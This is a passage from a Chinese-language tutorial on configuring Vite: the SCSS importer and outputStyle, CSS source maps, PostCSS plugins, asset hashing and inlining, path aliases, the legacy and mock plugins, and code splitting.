<h5 data-id="heading-40"><strong>2. <code>importer</code> (高级用法)</strong></h5>
<p>这是一个函数，用于自定义 SCSS 的 <code>@import</code> 解析逻辑。当 SCSS 编译器遇到一个 <code>@import</code> 语句时，它会调用这个函数，让你有机会去自定义文件的查找和读取方式。</p>
<p>这通常用于一些比较复杂的场景，例如：</p>
<ul>
<li>从 <code>node_modules</code> 中引入文件时，可以省略长长的路径。</li>
<li>根据不同的环境（开发 / 生产）引入不同的主题文件。</li>
</ul>
<p><strong>示例：</strong></p>
<p>假设你想让 <code>@import 'my-theme';</code> 能够直接找到 <code>src/themes/main.scss</code> 文件。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>;
<span class="hljs-keyword">import</span> fs <span class="hljs-keyword">from</span> <span class="hljs-string">'fs'</span>; <span class="hljs-comment">// 文件系统模块</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: {
        <span class="hljs-title function_">importer</span>(<span class="hljs-params">url, prev, done</span>) {
          <span class="hljs-comment">// url 是 @import 的目标，比如 'my-theme'</span>
          <span class="hljs-comment">// prev 是当前文件的路径</span>
          
          <span class="hljs-keyword">if</span> (url === <span class="hljs-string">'my-theme'</span>) {
            <span class="hljs-keyword">const</span> themePath = path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src/themes/main.scss'</span>);
            <span class="hljs-comment">// 读取文件内容并返回</span>
            <span class="hljs-keyword">return</span> { <span class="hljs-attr">contents</span>: fs.<span class="hljs-title function_">readFileSync</span>(themePath, <span class="hljs-string">'utf8'</span>) };
          }
          
          <span class="hljs-comment">// 如果不是我们关心的 url，就返回 null，让 SCSS 按默认方式处理</span>
          <span class="hljs-title function_">done</span>({ <span class="hljs-attr">file</span>: url });
        }
      },
    },
  },
});
</code></pre>
<h5 data-id="heading-41"><strong>3. <code>outputStyle</code></strong></h5>
<p>这个配置项用来指定最终生成的 CSS 代码的风格。</p>
<ul>
<li><code>'expanded'</code>: 展开的风格，每个选择器和属性都单独一行，可读性最好（默认）。</li>
<li><code>'compressed'</code>: 压缩后的风格，所有代码都挤在一行，没有空格和换行，文件体积最小。</li>
</ul>
<p><strong>注意</strong>：这个配置是作用于 SCSS 编译器本身的。在 Vite 中，开发环境下，最终的 CSS 输出还会受到 Vite 自身的 <code>build.cssMinify</code> 配置影响。通常，我们只在需要单独调试 SCSS 输出时才会关注这个选项。</p>
<h3 data-id="heading-42">css.devSourcemap(源映射)</h3>
<p><code>devSourcemap</code> 是开发环境中用于生成 CSS 源映射的配置，让浏览器开发者工具直接关联原始源码（如 SCSS、Less），而非编译后的压缩 CSS。</p>
<p>因为使用 CSS 预处理器（SCSS、Less、Stylus）时，编译后的代码与源码结构差异大，需源映射关联，以提高调试效率。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-attr">css</span>: {
    <span class="hljs-attr">devSourcemap</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 开发环境开启源映射</span>
    <span class="hljs-attr">preprocessorOptions</span>: {
      <span class="hljs-attr">scss</span>: { <span class="hljs-comment">/* 预处理器配置 */</span> }
    }
  }
}
</code></pre>
<p>当我们不配置<code>devSourcemap</code>时</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.base.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 基础公共配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">css</span>: { <span class="hljs-comment">// 配置css行为</span>
        <span class="hljs-attr">devSourcemap</span>: <span class="hljs-literal">false</span>
    }
})

</code></pre>
<p>启动开发服务器，如图当我们查看某一个元素的样式时，不会指出css来源</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f930ff9bb9144f51847f86cc0fa19140~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=EyKMnO34q7YVzBNV3o3kYxJVMjU%3D" loading="lazy"/>
<p>当配置<code>devSourcemap</code>为<code>true</code>时，再次查看</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e0b37cac61db4d45a7e37efd5e709747~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=39rE9wCYL7KhLqs07VtYgmUOmRI%3D" loading="lazy"/>
<p>推荐在开发环境下开始源码映射，生产环境建议关闭，避免暴露源码结构.</p>
<h3 data-id="heading-43">css.postcss</h3>
<p>这是 Vite 中用于<strong>配置 PostCSS 处理器</strong>的核心选项。PostCSS 本身是一个用 JavaScript 工具和插件转换 CSS 代码的工具，可以通过其丰富的插件来实现<strong>自动添加浏览器前缀、CSS语法降级、代码质量检查与规范约束、使用未来 CSS 语法、代码压缩优化</strong>等功能。在 Vite 中内置并支持PostCSS，但是如果要使用它的插件需要安装相关依赖</p>
<h4 data-id="heading-44">常用的PostCSS插件</h4>
<ul>
<li>
<p><code>postcss-preset-env</code>PostCSS预设包，预设了一些常用的插件的配置项（例如<code>autoprefixer</code>的自动补全）</p>
</li>
<li>
<p><code>autoprefixer</code>: 根据<code>package.json</code>的<code>browserslist</code>配置自动添加浏览器前缀（如<code>-webkit-</code>、<code>-moz-</code>）</p>
</li>
<li>
<p><code>cssnano</code>:压缩 CSS 代码，移除空格、注释、合并重复规则，减少文件体积</p>
</li>
<li>
<p><code>stylelint</code>:检查 CSS 代码中的语法错误和风格问题（如属性排序、单位规范）</p>
</li>
<li>
<p><code>postcss-modules</code>:实现CSS模块化，避免样式污染(类似Vue的<code>&lt;style scoped&gt;</code>)</p>
</li>
</ul>
<p>**browserslist 配置 **</p>
<p>在<code>package.json</code>中来配置兼容范围的好处就是，可以使得<code>babel</code>和<code>PostCSS</code>处理语法兼容性的问题时的兼容范围一致</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-comment">// package.json</span>
<span class="hljs-punctuation">{</span>
	<span class="hljs-attr">"browserslist"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">[</span><span class="hljs-string">"cover: 99.5%"</span><span class="hljs-punctuation">]</span>
<span class="hljs-comment">//"cover: 99.5%" 表示让 PostCSS 等工具适配全球 99.5% 的浏览器，</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<h4 data-id="heading-45">vite中配置</h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// vite.config.js</span>
<span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> postcssPresetEnv <span class="hljs-keyword">from</span> <span class="hljs-string">'postcss-preset-env'</span>
<span class="hljs-comment">// import autoprefixer from 'autoprefixer'</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">css</span>: {
       <span class="hljs-attr">postcss</span>: { <span class="hljs-comment">// 配置postcss，完全支持在.postcss.config.js中的所能使用的配置项</span>
            <span class="hljs-attr">plugins</span>: [ <span class="hljs-comment">// 安装postcss插件</span>
                <span class="hljs-title function_">postcssPresetEnv</span>({})
                <span class="hljs-comment">// autoprefixer({</span>
                <span class="hljs-comment">//     // 指定兼容 99.5%的浏览器。</span>
                <span class="hljs-comment">//     // browsers: ["cover 99.5%"],</span>
                <span class="hljs-comment">//     // 也可以在package.json中配置browerslist配置项</span>
                <span class="hljs-comment">// })</span>
            ]
        },
    }
})
</code></pre>
<p><code>b.modules.css</code>中：</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.demo</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: skyblue;
}

<span class="hljs-selector-class">.demo-content</span> {
    <span class="hljs-attribute">width</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">height</span>: <span class="hljs-number">100px</span>;
    <span class="hljs-attribute">background-color</span>: green;
    <span class="hljs-attribute">display</span>: flex; // 添加该行属性
}
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea29ac21cfbf49e9910cb8e04e9a1fb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=hD3W1jKuIlKxbMOg1f5aqUBXZwo%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-46">Vite加载静态资源</h3>
<p><strong>静态资源</strong></p>
<p>静态资源通常来说是网站中哪些不会随请求变化而变化的文件，浏览器可直接下载并渲染 / 使用，无需额外编译（或仅需前端构建工具预处理）。</p>
<p>常见的静态资源包括：</p>
<ul>
<li>图片：PNG、JPG、GIF、SVG、WebP等</li>
<li>字体：TTF、OTF、WOFF、WOFF等</li>
<li>媒体：MP4、WebM、MP3、AAC等</li>
<li>样式：CSS文件</li>
<li>脚本：不涉及服务端动态逻辑的JS文件（第三方库、前端工具脚本）</li>
<li>其他：图标（favicon.ico）、JSON配置文件、静态HTML等</li>
</ul>
<h4 data-id="heading-47">vite中的静态资源</h4>
<p>Vite 中对静态资源处理的范围是静态资源的一个子集，主要识别一下两种为Vite所认为的静态资源</p>
<ul>
<li>当你在代码中通过 <code>import</code> 或 <code>require</code> 导入一个非 JavaScript 文件时，Vite 会将其视为一个需要被处理的静态资源。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>
<span class="hljs-keyword">import</span> logo <span class="hljs-keyword">from</span> <span class="hljs-string">'./assets/logo.png'</span>; <span class="hljs-comment">// Vite 会处理 logo.png</span>
<span class="hljs-keyword">import</span> style <span class="hljs-keyword">from</span> <span class="hljs-string">'./style.css'</span>;     <span class="hljs-comment">// Vite 会处理 style.css</span>
</code></pre>
<ul>
<li>Vite 会将项目根目录下 <code>public</code> 文件夹中的所有文件，视为<strong>无需处理的静态资源</strong>。</li>
</ul>
<h4 data-id="heading-48">生产环境下Vite对静态资源的处理行为</h4>
<p><strong>浏览器缓存</strong></p>
<p>我们通过之前的学习已经知道了浏览器的缓存机制（尤其是强缓存，如 <code>Cache-Control: max-age=31536000</code>）会根据<strong>文件名</strong>来判断是否需要重新请求资源。所以呢当文件内容变动而文件名没有发生改变时，浏览器会继续使用缓存文件，而不是重新请求文件。</p>
<p><strong>Vite 的hash命名处理</strong></p>
<p>Vite 根据每一个文件的内容计算出一个哈希值，然后将这个哈希值作为文件的一部分对文件进行重命名(demo.[hash].js)</p>
<p>,所以一旦内容发生变动，哈希值就会发生变动。</p>
<p><strong>与浏览器缓存机制的配合</strong></p>
<p>利用浏览器缓存策略和Vite的哈希计算命名，就可以很好的控制浏览器的请求资源的行为：</p>
<ul>
<li>当文件没有发生改变时，文件名不变，浏览器使用缓存文件。</li>
<li>当文件内容发生改变时，文件名发生改变，浏览器重新请求文件，并再次缓存。</li>
</ul>
<p>例如在<code>main.js</code>的内容如下</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello world'</span>)
</code></pre>
<p>启动生产构建命令：<code>pnpm build</code>时，查看项目根目录下的<code>dist</code>目录下</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/04d61f3fff7d441eb0046ea627eb6b96~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=jpC5hgNDAujXFd30sE4dFbGKDaA%3D" alt="" loading="lazy"/></p>
<p>当在最后一行添加注释后，重新构建</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'hello world'</span>)
<span class="hljs-comment">// 新增注释</span>
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/988969f749cf4648a5a08e44b546c527~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=QVvb1h2CKhnDFjyxhpmVExTIexY%3D" alt="" loading="lazy"/></p>
<p>可以看到文件名发生了变化</p>
<h4 data-id="heading-49">.build.rollupOptions</h4>
<p>在该配置项下可以配置<code>Rollup</code>的打包行为，因为生产环境下 <strong>Vite</strong> 使用 <strong>Rollup</strong>进行打包。</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-comment">// 生产环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">build</span>: {
        <span class="hljs-attr">assetsInlineLimit</span>: <span class="hljs-number">10</span> * <span class="hljs-number">1024</span>, 
        <span class="hljs-attr">rollupOptions</span>: { <span class="hljs-comment">// 配置rollup的一些构建策略</span>
            <span class="hljs-attr">output</span>: { <span class="hljs-comment">// 控制输出行为</span>
                <span class="hljs-attr">assetFileNames</span>: <span class="hljs-string">"[hash].[name].[Sext]"</span>
                <span class="hljs-comment">/** 处理打包后静态资源文件名
                 * * hash - Rollup根据文件内容计算的哈希值
                 * * name - 原文件名，如demo.js，name="demo"
                 * * .ext - 文件后缀名，如`.js、.vue...`
                 */</span>
            },
        },
    },
})
</code></pre>
<p>运行一下<code>pnpm build</code>，查看<code>dist</code>目录下的变化，可以看到静态资源的文件名处理行为已经改为hash值在前了</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7257d783864749daa3b5787771ccbde3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=BqTium%2B8EdWt2e4OdFYvAMG6Ujc%3D" alt="" loading="lazy"/></p>
<h4 data-id="heading-50">.build.assetsInlineLimit</h4>
<ul>
<li><strong>默认值</strong>：<code>4096</code> (4KB）。</li>
<li>生产环境下，对于<strong>小于或等于</strong> <code>assetsInlineLimit</code> 的值，Vite 会将其<strong>直接内联</strong>到最终的 JS 或 CSS 文件中，而不是生成一个单独的文件。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>

<span class="hljs-comment">// 生产环境配置</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> (env) =&gt; <span class="hljs-title function_">defineConfig</span>({
    <span class="hljs-attr">build</span>: {
        <span class="hljs-attr">assetsInlineLimit</span>: <span class="hljs-number">10</span> * <span class="hljs-number">1024</span>,
    }
})
</code></pre>
<p>如果某个图片资源小于10KB，Vite就会将其转换为<code>base64</code>格式内联到项目中，反之则处理为静态资源。</p>
<p>对于有很多图标或者图片小于10KB的项目来说可以极大的减少http请求，提高网页性能。不过转换为<code>base64</code>字符串格式之后，体积一般会增大30%。</p>
<h3 data-id="heading-51">.build.outDir</h3>
<ul>
<li>配置生产环境打包后的文件夹名</li>
<li><strong>默认值</strong>："dist"</li>
<li>**类型：**字符串</li>
</ul>
<h3 data-id="heading-52">.build.assetsDir</h3>
<ul>
<li>配置生产环境打包后的静态资源文件夹名</li>
<li><strong>默认值：</strong>"assets"</li>
<li>**类型：**字符串</li>
</ul>
<h3 data-id="heading-53">配置路径别名</h3>
<p>通常在项目中问我们可以看到如下的导入方式</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-title class_">SchedulStaff</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'@/views/schedule/staff/index.vue'</span>
</code></pre>
<p>可以看到路径开头是<code>'@'</code>不是相对路径也不是绝对路径的形式，这就是路径别名，用<code>@</code>来代替部分路径。</p>
<p>所以对于深层目录下的文件导入上层资源时，容易出现 <code>../../views/schedule/staff/index.vue</code> 这类难以维护的路径，<code>@</code> 可直接简化为 <code>@/views/schedule/staff/index.vue</code>。</p>
<h4 data-id="heading-54"><strong>.resovle.alias</strong></h4>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> path <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span> <span class="hljs-comment">// node内置模块</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-attr">resolve</span>: {
		<span class="hljs-attr">alias</span>: {
			<span class="hljs-string">"@"</span>: path.<span class="hljs-title function_">resolve</span>(__dirname, <span class="hljs-string">'src'</span>),
            <span class="hljs-string">"@assets"</span>: path.<span class="hljs-title function_">resolve</span>(__diname, <span class="hljs-string">'src/assets'</span>),
            <span class="hljs-comment">/**
             * path.resolve() - path模块提供的拼接路径的方法
             * ——dirname - node内置变量，获取当前配置文件所在目录的绝对路径
             */</span>
		}
	}
})
</code></pre>
<p>配置完成后，在Vite项目中就可以使用<code>@</code>来代替指定的路径。</p>
<p>在<code>src/test.js</code>中写入</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'路径别名配置成功'</span>)
</code></pre>
<p>在<code>main.js</code>中引入</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> <span class="hljs-string">'@/test.js'</span>
</code></pre>
<p>启动项目，打开浏览器控制台：</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/166b4bc1597b4d6e868da30f02ffff76~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=TwOm%2Fqa06A2ZR%2Bt6cshu69Adi2k%3D" loading="lazy"/>
<h4 data-id="heading-55">路径提示以及TS项目中配置</h4>
<p>默认情况下配置好了路径别名后，Vite能识别别名但是不会做出路径提示</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5531d327a9f4395bc6a5342c233aa65~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=zjSTR0eDeXe3%2FfhNncsqLhUq%2B5E%3D" loading="lazy"/>
<p>可以在<code>jsconfig.json</code>或者<code>tsconfig.json</code>中写入如下配置</p>
<pre><code class="hljs language-js" lang="js">{
  <span class="hljs-string">"compilerOptions"</span>: {
    <span class="hljs-string">"baseUrl"</span>: <span class="hljs-string">"."</span>,
    <span class="hljs-string">"paths"</span>: {
      <span class="hljs-string">"@/*"</span>: [<span class="hljs-string">"src/*"</span>], <span class="hljs-comment">// 与 Vite 配置一致</span>
      <span class="hljs-string">"@assets/*"</span>: [<span class="hljs-string">"src/assets/*"</span>]
    }
  }
}
</code></pre>
<p>以上配置有如下效果</p>
<ul>
<li>在项目中出现路径提示功能</li>
</ul>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2a485794c1534bcabc80c179f48a9d59~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=%2BbcXjJSN87HFm1MwjMQc9ZpRj7s%3D" loading="lazy"/>
<ul>
<li>TypeScript 项目，vite中配置别名后需要配合在 <code>tsconfig.json</code> 中补充路径映射，否则 TS 会提示 “模块找不到”：</li>
</ul>
<h4 data-id="heading-56">两种路径风格</h4>
<p>在用 Vue 脚手架工具时我们会发现，在配置路径别名的时候，路径配置用的时如下方式，<code>fileURLToPath(new URL('src', import.meta.url))</code>这种方式是<strong>现代的 ES Modules (ESM) 风格</strong>，而对于<code>path.resolve(__dirname, 'src')</code>是<strong>CommonJS风格</strong>的方式。</p>
<ul>
<li><strong><code>import.meta.url</code></strong>: 这是 ESM 模块中的一个元数据属性。它返回当前模块文件的<strong>文件 URL 地址</strong>。</li>
<li><strong><code>new URL('src', import.meta.url)</code></strong>: 这里使用了浏览器和 Node.js 都支持的 <code>URL</code> 构造函数。它的第二个参数是<strong>基准 URL</strong>。这个操作会将相对路径 <code>'src'</code> 解析为基于当前模块 URL 的一个<strong>绝对 URL</strong>。结果会是 <code>file:///path/to/your/project/src</code>。</li>
<li><strong><code>fileURLToPath()</code></strong>: 这是 Node.js <code>url</code> 模块提供的一个方法。它的作用是将一个 <code>file:</code> 协议的 URL 对象或字符串，转换为 Node.js 所使用的<strong>本地文件系统路径字符串</strong>（例如 <code>C:\path\to\src</code> 或 <code>/path/to/src</code>）。</li>
</ul>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>
<span class="hljs-keyword">import</span> { fileURLToPath, <span class="hljs-variable constant_">URL</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'node:url'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
	<span class="hljs-attr">resolve</span>: {
		<span class="hljs-attr">alias</span>: {
            <span class="hljs-string">"@assets"</span>: <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_">URL</span>(<span class="hljs-string">'src'</span>, <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>)),
		}
	}
})
</code></pre>
<p>Vite使用的是ESM风格，所以 Vite也更推荐使用<code>fileURLToPath(new URL('src', import.meta.url))</code></p>
<p>这种方式来进行路径配置。</p>
<h3 data-id="heading-57">Vite 插件</h3>
<p>Vite 插件是基于 <strong>Rollup 插件接口</strong> 扩展的工具，用于增强 Vite 的核心能力（如模块转换、依赖处理、服务器中间件、构建优化等）。Vite 本身的很多核心功能（如 CSS 处理、TS 转译）也是通过内置插件实现的，第三方插件可以无缝集成，覆盖开发 / 构建全流程。</p>
<h4 data-id="heading-58">@vitejs/plugin-legacy</h4>
<p>Vite 官方插件，核心作用是对 js 语法降级<strong>让生产环境的构建产物兼容旧版浏览器</strong>（比如 IE11、旧版 Chrome/Firefox）。</p>
<p><strong>安装</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">// npm
npm install @vitejs/plugin-legacy --save-dev
// pnpm
pnpm add @vitejs/plugin-legacy -D
</code></pre>
<p><strong>配置</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> legacy <span class="hljs-keyword">from</span> <span class="hljs-string">'@vitejs/plugin-legacy'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
    <span class="hljs-title function_">legacy</span>({
      <span class="hljs-attr">targets</span>: [<span class="hljs-string">'defaults'</span>, <span class="hljs-string">'not IE 11'</span>] <span class="hljs-comment">// 支持的目标浏览器（排除 IE11）</span>
      <span class="hljs-comment">// 也可以在package.json中配置browerslist配置项，统一css、js语法降级范围  </span>
    })
  ]
});
</code></pre>
<p><strong>使用：</strong></p>
<p>配置完成后运行<code>pnpm build</code>命令Vite就会在对应的时机使用该插件进行JS语法降级</p>
<h4 data-id="heading-59"><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fenjoycoding%2Fvite-plugin-mock-server" target="_blank" title="https://github.com/enjoycoding/vite-plugin-mock-server" ref="nofollow noopener noreferrer">vite-plugin-mock</a></h4>
<p><code>vite-plugin-mock</code> 是一个在 Vite 项目中模拟后端 API 的插件，其内部依赖<code>mock.js</code>，它的核心作用是<strong>在开发环境中拦截前端发起的 API 请求，并返回预设的模拟数据</strong>，从而让前端开发可以不依赖真实的后端服务就能独立进行。</p>
<p><strong>安装</strong></p>
<pre><code class="hljs language-powershell" lang="powershell">npm install vite-plugin-mock --save-dev
pnpm add vite-plugin-mock -D
</code></pre>
<p><strong>配置</strong></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">import</span> { defineConfig } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite'</span>;
<span class="hljs-keyword">import</span> { viteMockServe } <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-mock'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [
		<span class="hljs-title function_">viteMockServe</span>({
            <span class="hljs-attr">mockPath</span>: <span class="hljs-string">'./src/mock'</span>, <span class="hljs-comment">// 模拟数据文件所在的目录</span>
            <span class="hljs-attr">localEnabled</span>: <span class="hljs-literal">true</span>, <span class="hljs-comment">// 开发环境是否启用 mock</span>
            <span class="hljs-attr">prodEnabled</span>: <span class="hljs-literal">false</span>, <span class="hljs-comment">// 生产环境是否启用 mock（一般关闭）</span>
        })
  ]
});
</code></pre>
<p><strong>使用</strong></p>
<p>在src目录下创建<code>src/mock/user.js</code></p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// user.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> [
  {
    <span class="hljs-attr">url</span>: <span class="hljs-string">'/api/users'</span>, <span class="hljs-comment">// 要拦截的 API 路径</span>
    <span class="hljs-attr">method</span>: <span class="hljs-string">'get'</span>, <span class="hljs-comment">// 请求方法</span>
    <span class="hljs-attr">response</span>: <span class="hljs-function">() =&gt;</span> {
      <span class="hljs-comment">// 模拟返回的数据</span>
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">code</span>: <span class="hljs-number">200</span>,
        <span class="hljs-attr">message</span>: <span class="hljs-string">'success'</span>,
        <span class="hljs-attr">data</span>: [
          { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'张三'</span> },
          { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'李四'</span> },
        ],
      };
    },
  },
];
</code></pre>
<p>在main.js中请求</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// main.js</span>
<span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/users'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(res);
})
</code></pre>
<p>启动开发服务，查看浏览器请求预览</p>
<img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f6e17661ec224143b07a8d162c2a0d32~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc2FiZXJ4eUw=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770697908&amp;x-signature=%2BSTecxYOKpckzzdiim4ZWtHurEQ%3D" loading="lazy"/>
<h3 data-id="heading-60">生产环境性能优化</h3>
<h4 data-id="heading-61"><strong>分包策略:代码分割</strong></h4>
<p>对于vite中的代码分割的原理可以参考这一篇文章：<a href="https://link.juejin.cn?target=https%3A%2F%2Fzhuanlan.zhihu.com%2Fp%2F1919790978333639843" target="_blank" title="https://zhuanlan.zhihu.com/p/1919790978333639843" ref="nofollow noopener noreferrer">深入解析 Vite 代码分割原理：从依赖入口点算法到动态导入优化 - WangHaoyu的文章 - 知乎。</a></p>
<h5 data-id="heading-62">作用：</h5>
<p>在实际项目中，我们在生产环境打包时，对于那些第三方库和自己的代码可以分开打包，这样做的好处有以下几点：</p>
<ul>
<li>消除代码冗余，减小总打包体积</li>
</ul>
<p>大型项目中，多个页面可能共用同一个组件（如弹窗、按钮），不分割的话，这个组件会被重复打包到每个页面的 bundle 里，导致总体积膨胀。</p>
<p>代码分割会把 “公共代码” 抽成独立 chunk，只打包一次，所有页面共享 ——<strong>总打包体积更小，且不会出现重复代码</strong>。</p>
<ul>
<li>减少首屏加载时间，提升用户体验</li>
</ul>
<p>不分割的代码会打包成一个巨大的<code>bundle.js</code>（可能几 MB 甚至十几 MB），用户打开页面时，必须等这个文件完全下载、解析、执行才能看到内容，体验极差（尤其是弱网 / 移动端）。</p>
